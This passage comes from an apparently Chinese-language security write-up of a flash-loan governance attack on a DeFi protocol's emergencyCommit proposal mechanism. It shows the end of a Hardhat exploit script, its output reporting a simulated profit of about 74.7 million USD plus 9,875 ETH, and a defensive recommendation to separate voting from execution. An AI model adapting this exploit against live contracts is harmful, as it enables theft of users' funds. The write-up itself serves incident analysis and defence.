    console.log("step 2: wait for a day, to met the emergencyWithdraw time requirement.");
    await hre.network.provider.send("evm_increaseTime", [3600 * 24]);
    await hre.network.provider.send("evm_mine");
    console.log("step 3: launch the attack.");
    await attack.profit();



}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});

```

攻击结果：

```
Starting: scripts/exp.js
bip18 contract deployed to: 0x071De7C3f893dF0433aA9875b98573c311cEbEb3
attack contract deployed to: 0xF13a26aE5220Bd9938a01e82D942f7861E137CBf
step 1: get some beans and make a proposal.
step 2: wait for a day, to met the emergencyWithdraw time requirement.
step 3: launch the attack.
Attack Start!
Attack complete!!!
Attacker profit:
usdt:  6386063 USD
dai:   14953731 USD
usdc:  21337084 USD
bean:  32071604 USD
weth:  9875
total: 74748482 USD and 9875 ETH
```



## 总结

涉及项目治理投票的关键操作如果唯票数论就违背了其社区治理的初衷，并且在闪电贷攻击面前投票代币数量条件也是形同虚设。类似的 emergencyCommit 接口实现时可以考虑将投票和执行操作拆分，在两个区块高度内分别完成，以此抵御闪电贷攻击。